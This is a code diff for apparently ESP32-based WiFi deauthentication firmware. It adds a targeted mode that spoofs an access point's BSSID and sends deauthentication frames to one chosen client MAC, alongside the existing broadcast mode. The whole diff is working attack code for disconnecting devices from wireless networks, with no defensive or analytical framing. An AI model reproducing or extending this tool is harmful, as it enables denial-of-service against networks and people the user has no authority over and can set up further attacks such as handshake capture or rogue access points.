@@ -138,6 +138,8 @@ static bool is_running = false;
 static wifi_ap_record_t g_target_ap;
 static deauth_frame_type_t g_type;
 static bool g_is_broadcast;
+static bool g_has_client = false;
+static uint8_t g_target_client[6];
 
 static void deauth_task(void *pvParameters) {
   ESP_LOGI(TAG, "Deauther Task Started");
@@ -149,7 +151,11 @@ static void deauth_task(void *pvParameters) {
   if (g_is_broadcast) {
     memset(&frame[4], 0xFF, 6);
   } else {
-    memcpy(&frame[4], g_target_ap.bssid, 6);
+    if (g_has_client) {
+      memcpy(&frame[4], g_target_client, 6);
+    } else {
+      memcpy(&frame[4], g_target_ap.bssid, 6);
+    }
   }
   memcpy(&frame[10], g_target_ap.bssid, 6);
   memcpy(&frame[16], g_target_ap.bssid, 6);
@@ -184,6 +190,45 @@ bool wifi_deauther_start(const wifi_ap_record_t *ap_record, deauth_frame_type_t 
   memcpy(&g_target_ap, ap_record, sizeof(wifi_ap_record_t));
   g_type = type;
   g_is_broadcast = is_broadcast;
+  g_has_client = false;
+  is_running = true;
+
+  deauth_task_stack = (StackType_t *)heap_caps_malloc(DEAUTHER_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+  deauth_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+
+  if (!deauth_task_stack || !deauth_task_tcb) {
+    ESP_LOGE(TAG, "Failed to alloc Deauther Task PSRAM");
+    if (deauth_task_stack) { heap_caps_free(deauth_task_stack); deauth_task_stack = NULL; }
+    if (deauth_task_tcb) { heap_caps_free(deauth_task_tcb); deauth_task_tcb = NULL; }
+    is_running = false;
+    return false;
+  }
+
+  deauth_task_handle = xTaskCreateStatic(
+    deauth_task,
+    "deauth_task",
+    DEAUTHER_STACK_SIZE,
+    NULL,
+    5,
+    deauth_task_stack,
+    deauth_task_tcb
+  );
+
+  return (deauth_task_handle != NULL);
+}
+
+bool wifi_deauther_start_targeted(const wifi_ap_record_t *ap_record, const uint8_t client_mac[6], deauth_frame_type_t type) {
+  if (is_running) return false;
+  if (ap_record == NULL || client_mac == NULL) return false;
+
+  if (deauth_task_stack) { heap_caps_free(deauth_task_stack); deauth_task_stack = NULL; }
+  if (deauth_task_tcb) { heap_caps_free(deauth_task_tcb); deauth_task_tcb = NULL; }
+
+  memcpy(&g_target_ap, ap_record, sizeof(wifi_ap_record_t));
+  memcpy(g_target_client, client_mac, sizeof(g_target_client));
+  g_type = type;
+  g_is_broadcast = false;
+  g_has_client = true;
   is_running = true;
 
   deauth_task_stack = (StackType_t *)heap_caps_malloc(DEAUTHER_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
